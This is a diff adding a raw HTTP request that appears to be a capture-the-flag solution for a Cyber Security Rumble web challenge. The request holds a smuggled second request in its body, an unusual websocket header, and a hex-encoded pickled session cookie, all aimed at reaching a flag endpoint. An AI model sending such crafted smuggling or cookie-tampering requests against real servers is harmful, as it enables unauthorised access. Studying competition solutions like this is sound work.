@@ -1,0 +1,22 @@
+POST /?save=flag HTTP/1.1
+Host: chal.cybersecurityrumble.de:22001
+Content-Length: 74
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://chal.cybersecurityrumble.de:22001
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://chal.cybersecurityrumble.de:22001/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+sec-websocket-key1: 1
+Cookie: user=8004953a000000000000008c06776562617070948c04557365729493942981947d94288c08757365726e616d65948c036c656f948c0a7065726d697373696f6e948975622e-839e3bbc; PHPSESSID=8du6ncikva8umc9m67v1u7eheh
+Connection: close
+
+echo=AAAPOST /?save=flag HTTP/1.1
+Host: chal.cybersecurityrumble.de:22001
+
+
+
+Access /debug/flag
